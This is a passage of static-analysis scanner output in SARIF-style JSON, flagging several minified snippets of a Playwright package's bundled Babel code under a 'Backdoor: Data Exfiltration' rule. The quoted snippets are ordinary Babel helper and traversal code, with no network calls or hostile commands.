                    "text": "w WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function(e){return e?t:r})(e)}export default function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||\"object\"!=typeof e&&\"function\"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if(\"default\"!==u&&{}.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}'),isNativeRe",
                    "rendered": {
                      "text": "w WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function(e){return e?t:r})(e)}export default function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||\"object\"!=typeof e&&\"function\"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if(\"default\"!==u&&{}.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}'),isNativeRe",
                      "markdown": "`w WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function(e){return e?t:r})(e)}export default function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||\"object\"!=typeof e&&\"function\"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if(\"default\"!==u&&{}.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}'),isNativeRe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 71202,
                  "endLine": 66,
                  "endColumn": 71207,
                  "snippet": {
                    "text": " default function _checkInRHS(e){if(Object(e)!==e)throw TypeError(\"right-hand side of 'in' should be an object, got \"+(null!==e?typeof e:\"null\"));return e}`),classPrivateFieldGet2:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default function _classPrivateFieldGet2(s,a){return s.get(assertClassBrand(s,a))}'),classPrivateFieldSet2:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default function _classPrivateFieldSet2(s,a,r){return s.set(assertClassBrand(s,a),r),r}'),classPrivateGetter:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default f",
                    "rendered": {
                      "text": " default function _checkInRHS(e){if(Object(e)!==e)throw TypeError(\"right-hand side of 'in' should be an object, got \"+(null!==e?typeof e:\"null\"));return e}`),classPrivateFieldGet2:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default function _classPrivateFieldGet2(s,a){return s.get(assertClassBrand(s,a))}'),classPrivateFieldSet2:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default function _classPrivateFieldSet2(s,a,r){return s.set(assertClassBrand(s,a),r),r}'),classPrivateGetter:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default f",
                      "markdown": "` default function _checkInRHS(e){if(Object(e)!==e)throw TypeError(\"right-hand side of 'in' should be an object, got \"+(null!==e?typeof e:\"null\"));return e}`),classPrivateFieldGet2:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default function _classPrivateFieldGet2(s,a){return s.get(assertClassBrand(s,a))}'),classPrivateFieldSet2:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default function _classPrivateFieldSet2(s,a,r){return s.set(assertClassBrand(s,a),r),r}'),classPrivateGetter:ze(\"7.24.0\",'import assertClassBrand from\"assertClassBrand\";export default f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 64853,
                  "endLine": 66,
                  "endColumn": 64858,
                  "snippet": {
                    "text": "bject.create(null==l?null:l),p=function(e,t,r,n){var o,a,i=[],s=function(t){return checkInRHS(t)===e},u=new Map;function l(e){e&&i.push(c.bind(null,e))}for(var f=0;f<t.length;f++){var p=t[f];if(Array.isArray(p)){var d=p[1],h=p[2],m=p.length>3,y=16&d,v=!!(8&d),g=0==(d&=7),b=h+\"/\"+v;if(!g&&!m){var w=u.get(b);if(!0===w||3===w&&4!==d||4===w&&3!==d)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+h);u.set(b,!(d>2)||d)}applyDec(v?e:e.prototype,",
                    "rendered": {
                      "text": "bject.create(null==l?null:l),p=function(e,t,r,n){var o,a,i=[],s=function(t){return checkInRHS(t)===e},u=new Map;function l(e){e&&i.push(c.bind(null,e))}for(var f=0;f<t.length;f++){var p=t[f];if(Array.isArray(p)){var d=p[1],h=p[2],m=p.length>3,y=16&d,v=!!(8&d),g=0==(d&=7),b=h+\"/\"+v;if(!g&&!m){var w=u.get(b);if(!0===w||3===w&&4!==d||4===w&&3!==d)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+h);u.set(b,!(d>2)||d)}applyDec(v?e:e.prototype,",
                      "markdown": "`bject.create(null==l?null:l),p=function(e,t,r,n){var o,a,i=[],s=function(t){return checkInRHS(t)===e},u=new Map;function l(e){e&&i.push(c.bind(null,e))}for(var f=0;f<t.length;f++){var p=t[f];if(Array.isArray(p)){var d=p[1],h=p[2],m=p.length>3,y=16&d,v=!!(8&d),g=0==(d&=7),b=h+\"/\"+v;if(!g&&!m){var w=u.get(b);if(!0===w||3===w&&4!==d||4===w&&3!==d)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+h);u.set(b,!(d>2)||d)}applyDec(v?e:e.prototype,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 61134,
                  "endLine": 66,
                  "endColumn": 61139,
                  "snippet": {
                    "text": "berDecs(e,t,r){for(var n,a,i,s=[],o=new Map,c=new Map,u=0;u<t.length;u++){var l=t[u];if(Array.isArray(l)){var f,p,d=l[1],h=l[2],v=l.length>3,y=d>=5,g=r;if(y?(f=e,0!=(d-=5)&&(p=a=a||[]),v&&!i&&(i=function(t){return checkInRHS(t)===e}),g=i):(f=e.prototype,0!==d&&(p=n=n||[])),0!==d&&!v){var m=y?c:o,b=m.get(h)||0;if(!0===b||3===b&&4!==d||4===b&&3!==d)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+h);!b&&d>2?m.set(h,d):m.set(h,!0)}applyMembe",
                    "rendered": {
                      "text": "berDecs(e,t,r){for(var n,a,i,s=[],o=new Map,c=new Map,u=0;u<t.length;u++){var l=t[u];if(Array.isArray(l)){var f,p,d=l[1],h=l[2],v=l.length>3,y=d>=5,g=r;if(y?(f=e,0!=(d-=5)&&(p=a=a||[]),v&&!i&&(i=function(t){return checkInRHS(t)===e}),g=i):(f=e.prototype,0!==d&&(p=n=n||[])),0!==d&&!v){var m=y?c:o,b=m.get(h)||0;if(!0===b||3===b&&4!==d||4===b&&3!==d)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+h);!b&&d>2?m.set(h,d):m.set(h,!0)}applyMembe",
                      "markdown": "`berDecs(e,t,r){for(var n,a,i,s=[],o=new Map,c=new Map,u=0;u<t.length;u++){var l=t[u];if(Array.isArray(l)){var f,p,d=l[1],h=l[2],v=l.length>3,y=d>=5,g=r;if(y?(f=e,0!=(d-=5)&&(p=a=a||[]),v&&!i&&(i=function(t){return checkInRHS(t)===e}),g=i):(f=e.prototype,0!==d&&(p=n=n||[])),0!==d&&!v){var m=y?c:o,b=m.get(h)||0;if(!0===b||3===b&&4!==d||4===b&&3!==d)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+h);!b&&d>2?m.set(h,d):m.set(h,!0)}applyMembe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 56449,
                  "endLine": 66,
                  "endColumn": 56454,
                  "snippet": {
                    "text": ".call(e,t)})):Object.defineProperty(t,n,c))}function applyMemberDecs(e,t){for(var r,n,a=[],i=new Map,o=new Map,s=0;s<t.length;s++){var c=t[s];if(Array.isArray(c)){var l,u,f=c[1],p=c[2],d=c.length>3,h=f>=5;if(h?(l=e,0!=(f-=5)&&(u=n=n||[])):(l=e.prototype,0!==f&&(u=r=r||[])),0!==f&&!d){var v=h?o:i,g=v.get(p)||0;if(!0===g||3===g&&4!==f||4===g&&3!==f)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+p);!g&&f>2?v.set(p,f):v.set(p,!0)}applyMembe",
                    "rendered": {
                      "text": ".call(e,t)})):Object.defineProperty(t,n,c))}function applyMemberDecs(e,t){for(var r,n,a=[],i=new Map,o=new Map,s=0;s<t.length;s++){var c=t[s];if(Array.isArray(c)){var l,u,f=c[1],p=c[2],d=c.length>3,h=f>=5;if(h?(l=e,0!=(f-=5)&&(u=n=n||[])):(l=e.prototype,0!==f&&(u=r=r||[])),0!==f&&!d){var v=h?o:i,g=v.get(p)||0;if(!0===g||3===g&&4!==f||4===g&&3!==f)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+p);!g&&f>2?v.set(p,f):v.set(p,!0)}applyMembe",
                      "markdown": "`.call(e,t)})):Object.defineProperty(t,n,c))}function applyMemberDecs(e,t){for(var r,n,a=[],i=new Map,o=new Map,s=0;s<t.length;s++){var c=t[s];if(Array.isArray(c)){var l,u,f=c[1],p=c[2],d=c.length>3,h=f>=5;if(h?(l=e,0!=(f-=5)&&(u=n=n||[])):(l=e.prototype,0!==f&&(u=r=r||[])),0!==f&&!d){var v=h?o:i,g=v.get(p)||0;if(!0===g||3===g&&4!==f||4===g&&3!==f)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+p);!g&&f>2?v.set(p,f):v.set(p,!0)}applyMembe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 52462,
                  "endLine": 66,
                  "endColumn": 52467,
                  "snippet": {
                    "text": "[r].call(e);return e}))}return function(e,t,r){var a=[];return function(e,t,r){for(var a,n,i=new Map,s=new Map,o=0;o<r.length;o++){var c=r[o];if(Array.isArray(c)){var l,u,f=c[1],p=c[2],d=c.length>3,h=f>=5;if(h?(l=t,0!=(f-=5)&&(u=n=n||[])):(l=t.prototype,0!==f&&(u=a=a||[])),0!==f&&!d){var v=h?s:i,g=v.get(p)||0;if(!0===g||3===g&&4!==f||4===g&&3!==f)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+p);!g&&f>2?v.set(p,f):v.set(p,!0)}applyMembe",
                    "rendered": {
                      "text": "[r].call(e);return e}))}return function(e,t,r){var a=[];return function(e,t,r){for(var a,n,i=new Map,s=new Map,o=0;o<r.length;o++){var c=r[o];if(Array.isArray(c)){var l,u,f=c[1],p=c[2],d=c.length>3,h=f>=5;if(h?(l=t,0!=(f-=5)&&(u=n=n||[])):(l=t.prototype,0!==f&&(u=a=a||[])),0!==f&&!d){var v=h?s:i,g=v.get(p)||0;if(!0===g||3===g&&4!==f||4===g&&3!==f)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+p);!g&&f>2?v.set(p,f):v.set(p,!0)}applyMembe",
                      "markdown": "`[r].call(e);return e}))}return function(e,t,r){var a=[];return function(e,t,r){for(var a,n,i=new Map,s=new Map,o=0;o<r.length;o++){var c=r[o];if(Array.isArray(c)){var l,u,f=c[1],p=c[2],d=c.length>3,h=f>=5;if(h?(l=t,0!=(f-=5)&&(u=n=n||[])):(l=t.prototype,0!==f&&(u=a=a||[])),0!==f&&!d){var v=h?s:i,g=v.get(p)||0;if(!0===g||3===g&&4!==f||4===g&&3!==f)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+p);!g&&f>2?v.set(p,f):v.set(p,!0)}applyMembe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 48307,
                  "endLine": 66,
                  "endColumn": 48312,
                  "snippet": {
                    "text": "bject.defineProperty(t,r,c))}function old_applyMemberDecs(e,t,a,r,o){for(var i,n,l=new Map,s=new Map,c=0;c<o.length;c++){var d=o[c];if(Array.isArray(d)){var u,f,p,v=d[1],y=d[2],h=d.length>3,m=v>=5;if(m?(u=t,f=r,0!=(v-=5)&&(p=n=n||[])):(u=t.prototype,f=a,0!==v&&(p=i=i||[])),0!==v&&!h){var b=m?s:l,g=b.get(y)||0;if(!0===g||3===g&&4!==v||4===g&&3!==v)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+y);!g&&v>2?b.set(y,v):b.set(y,!0)}old_applyM",
                    "rendered": {
                      "text": "bject.defineProperty(t,r,c))}function old_applyMemberDecs(e,t,a,r,o){for(var i,n,l=new Map,s=new Map,c=0;c<o.length;c++){var d=o[c];if(Array.isArray(d)){var u,f,p,v=d[1],y=d[2],h=d.length>3,m=v>=5;if(m?(u=t,f=r,0!=(v-=5)&&(p=n=n||[])):(u=t.prototype,f=a,0!==v&&(p=i=i||[])),0!==v&&!h){var b=m?s:l,g=b.get(y)||0;if(!0===g||3===g&&4!==v||4===g&&3!==v)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+y);!g&&v>2?b.set(y,v):b.set(y,!0)}old_applyM",
                      "markdown": "`bject.defineProperty(t,r,c))}function old_applyMemberDecs(e,t,a,r,o){for(var i,n,l=new Map,s=new Map,c=0;c<o.length;c++){var d=o[c];if(Array.isArray(d)){var u,f,p,v=d[1],y=d[2],h=d.length>3,m=v>=5;if(m?(u=t,f=r,0!=(v-=5)&&(p=n=n||[])):(u=t.prototype,f=a,0!==v&&(p=i=i||[])),0!==v&&!h){var b=m?s:l,g=b.get(y)||0;if(!0===g||3===g&&4!==v||4===g&&3!==v)throw Error(\"Attempted to decorate a public method/accessor that has the same name as a previously decorated public method/accessor. This is not currently supported by the decorators plugin. Property name was: \"+y);!g&&v>2?b.set(y,v):b.set(y,!0)}old_applyM`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 43909,
                  "endLine": 66,
                  "endColumn": 43914,
                  "snippet": {
                    "text": " from\"toPropertyKey\";function old_createMetadataMethodsForProperty(e,t,a,r){return{getMetadata:function(o){old_assertNotFinished(r,\"getMetadata\"),old_assertMetadataKey(o);var i=e[o];if(void 0!==i)if(1===t){var n=i.public;if(void 0!==n)return n[a]}else if(2===t){var l=i.private;if(void 0!==l)return l.get(a)}else if(Object.hasOwnProperty.call(i,\"constructor\"))return i.constructor},setMetadata:function(o,i){old_assertNotFinished(r,\"setMetadata\"),old_assertMetadataKey(o);var n=e[o];if(void 0===n&&(n=e[o]={}),1===t){var l=n.public;void 0===l&&(l=n.public={}),l[a]=i}else if(2===t){var s=n.priv;void 0===s",
                    "rendered": {
                      "text": " from\"toPropertyKey\";function old_createMetadataMethodsForProperty(e,t,a,r){return{getMetadata:function(o){old_assertNotFinished(r,\"getMetadata\"),old_assertMetadataKey(o);var i=e[o];if(void 0!==i)if(1===t){var n=i.public;if(void 0!==n)return n[a]}else if(2===t){var l=i.private;if(void 0!==l)return l.get(a)}else if(Object.hasOwnProperty.call(i,\"constructor\"))return i.constructor},setMetadata:function(o,i){old_assertNotFinished(r,\"setMetadata\"),old_assertMetadataKey(o);var n=e[o];if(void 0===n&&(n=e[o]={}),1===t){var l=n.public;void 0===l&&(l=n.public={}),l[a]=i}else if(2===t){var s=n.priv;void 0===s",
                      "markdown": "` from\"toPropertyKey\";function old_createMetadataMethodsForProperty(e,t,a,r){return{getMetadata:function(o){old_assertNotFinished(r,\"getMetadata\"),old_assertMetadataKey(o);var i=e[o];if(void 0!==i)if(1===t){var n=i.public;if(void 0!==n)return n[a]}else if(2===t){var l=i.private;if(void 0!==l)return l.get(a)}else if(Object.hasOwnProperty.call(i,\"constructor\"))return i.constructor},setMetadata:function(o,i){old_assertNotFinished(r,\"setMetadata\"),old_assertMetadataKey(o);var n=e[o];if(void 0===n&&(n=e[o]={}),1===t){var l=n.public;void 0===l&&(l=n.public={}),l[a]=i}else if(2===t){var s=n.priv;void 0===s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 38927,
                  "endLine": 66,
                  "endColumn": 38932,
                  "snippet": {
                    "text": ",r,n,s){this.queue=null,this.priorityQueue=null,this.parentPath=s,this.scope=t,this.state=n,this.opts=r}shouldVisit(t){let r=this.opts;if(r.enter||r.exit||r[t.type])return!0;let n=Rce[t.type];if(!(n!=null&&n.length))return!1;for(let s of n)if(t[s])return!0;return!1}create(t,r,n,s){return Lce.default.get({parentPath:this.parentPath,parent:t,container:r,key:n,listKey:s})}maybeQueue(t,r){this.queue&&(r?this.queue.push(t):this.priorityQueue.push(t))}visitMultiple(t,r,n){if(t.length===0)return!1;let s=[];for(let i=0;i<t.length;i++){let a=t[i];a&&this.shouldVisit(a)&&s.push(this.create(r,t,i,n))}return t",
                    "rendered": {
                      "text": ",r,n,s){this.queue=null,this.priorityQueue=null,this.parentPath=s,this.scope=t,this.state=n,this.opts=r}shouldVisit(t){let r=this.opts;if(r.enter||r.exit||r[t.type])return!0;let n=Rce[t.type];if(!(n!=null&&n.length))return!1;for(let s of n)if(t[s])return!0;return!1}create(t,r,n,s){return Lce.default.get({parentPath:this.parentPath,parent:t,container:r,key:n,listKey:s})}maybeQueue(t,r){this.queue&&(r?this.queue.push(t):this.priorityQueue.push(t))}visitMultiple(t,r,n){if(t.length===0)return!1;let s=[];for(let i=0;i<t.length;i++){let a=t[i];a&&this.shouldVisit(a)&&s.push(this.create(r,t,i,n))}return t",
                      "markdown": "`,r,n,s){this.queue=null,this.priorityQueue=null,this.parentPath=s,this.scope=t,this.state=n,this.opts=r}shouldVisit(t){let r=this.opts;if(r.enter||r.exit||r[t.type])return!0;let n=Rce[t.type];if(!(n!=null&&n.length))return!1;for(let s of n)if(t[s])return!0;return!1}create(t,r,n,s){return Lce.default.get({parentPath:this.parentPath,parent:t,container:r,key:n,listKey:s})}maybeQueue(t,r){this.queue&&(r?this.queue.push(t):this.priorityQueue.push(t))}visitMultiple(t,r,n){if(t.length===0)return!1;let s=[];for(let i=0;i<t.length;i++){let a=t[i];a&&this.shouldVisit(a)&&s.push(this.create(r,t,i,n))}return t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 36660,
                  "endLine": 66,
                  "endColumn": 36665,
                  "snippet": {
                    "text": "=null,this.type=null,this.parent=r,this.hub=t,this.data=null,this.context=null,this.scope=null}static get({hub:t,parentPath:r,parent:n,container:s,listKey:i,key:a}){if(!t&&r&&(t=r.hub),!n)throw new Error(\"To get a node path the parent needs to exist\");let o=s[a],l=xce.getOrCreateCachedPaths(t,n),u=l.get(o);return u||(u=new e(t,n),o&&l.set(o,u)),u.setup(r,s,i,a),u}getScope(t){return this.isScope()?new Sce.default(this):t}setData(t,r){return this.data==null&&(this.data=Object.create(null)),this.data[t]=r}getData(t,r){this.data==null&&(this.data=Object.create(null));let n=this.data[t];return n===void ",
                    "rendered": {
                      "text": "=null,this.type=null,this.parent=r,this.hub=t,this.data=null,this.context=null,this.scope=null}static get({hub:t,parentPath:r,parent:n,container:s,listKey:i,key:a}){if(!t&&r&&(t=r.hub),!n)throw new Error(\"To get a node path the parent needs to exist\");let o=s[a],l=xce.getOrCreateCachedPaths(t,n),u=l.get(o);return u||(u=new e(t,n),o&&l.set(o,u)),u.setup(r,s,i,a),u}getScope(t){return this.isScope()?new Sce.default(this):t}setData(t,r){return this.data==null&&(this.data=Object.create(null)),this.data[t]=r}getData(t,r){this.data==null&&(this.data=Object.create(null));let n=this.data[t];return n===void ",
                      "markdown": "`=null,this.type=null,this.parent=r,this.hub=t,this.data=null,this.context=null,this.scope=null}static get({hub:t,parentPath:r,parent:n,container:s,listKey:i,key:a}){if(!t&&r&&(t=r.hub),!n)throw new Error(\"To get a node path the parent needs to exist\");let o=s[a],l=xce.getOrCreateCachedPaths(t,n),u=l.get(o);return u||(u=new e(t,n),o&&l.set(o,u)),u.setup(r,s,i,a),u}getScope(t){return this.isScope()?new Sce.default(this):t}setData(t,r){return this.data==null&&(this.data=Object.create(null)),this.data[t]=r}getData(t,r){this.data==null&&(this.data=Object.create(null));let n=this.data[t];return n===void `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 34826,
                  "endLine": 66,
                  "endColumn": 34831,
                  "snippet": {
                    "text": "s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingIdentifierPaths(e,!0)}});var gC=E(No=>{\"use strict\";Object.defineProperty(No,\"__esModule\",{value:!0});No.addComment=gce;No.addComments=bce;No.shareCommentsWithSiblings=yce;var dce=De(),{addComment:h",
                    "rendered": {
                      "text": "s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingIdentifierPaths(e,!0)}});var gC=E(No=>{\"use strict\";Object.defineProperty(No,\"__esModule\",{value:!0});No.addComment=gce;No.addComments=bce;No.shareCommentsWithSiblings=yce;var dce=De(),{addComment:h",
                      "markdown": "`s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingIdentifierPaths(e,!0)}});var gC=E(No=>{\"use strict\";Object.defineProperty(No,\"__esModule\",{value:!0});No.addComment=gce;No.addComments=bce;No.shareCommentsWithSiblings=yce;var dce=De(),{addComment:h`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 34721,
                  "endLine": 66,
                  "endColumn": 34726,
                  "snippet": {
                    "text": "r(;n.length;){let i=n.shift();if(!i||!i.node)continue;let a=hC.keys[i.node.type];if(i.isIdentifier()){e?(s[i.node.name]=s[i.node.name]||[]).push(i):s[i.node.name]=i;continue}if(i.isExportDeclaration()){let o=i.get(\"declaration\");Gue(o)&&n.push(o);continue}if(t){if(i.isFunctionDeclaration()){n.push(i.get(\"id\"));continue}if(i.isFunctionExpression())continue}if(a)for(let o=0;o<a.length;o++){let l=a[o],u=i.get(l);Array.isArray(u)?n.push(...u):u.node&&n.push(u)}}return s}function pce(e=!1){return this.getBindingIdentifierPaths(e,!0)}});var gC=E(No=>{\"use strict\";Object.defineProperty(No,\"__esModule\",{va",
                    "rendered": {
